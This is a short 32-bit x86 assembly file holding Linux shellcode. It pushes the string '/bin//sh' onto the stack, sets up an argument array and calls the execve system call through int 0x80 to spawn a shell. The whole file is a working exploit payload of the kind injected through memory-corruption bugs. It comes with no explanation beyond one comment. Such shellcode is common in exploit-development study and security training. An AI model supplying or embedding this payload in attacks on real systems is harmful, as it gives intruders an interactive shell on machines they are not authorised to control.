bits 32
    ;; executes "/bin/sh" with no additional args and NULL envp.
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80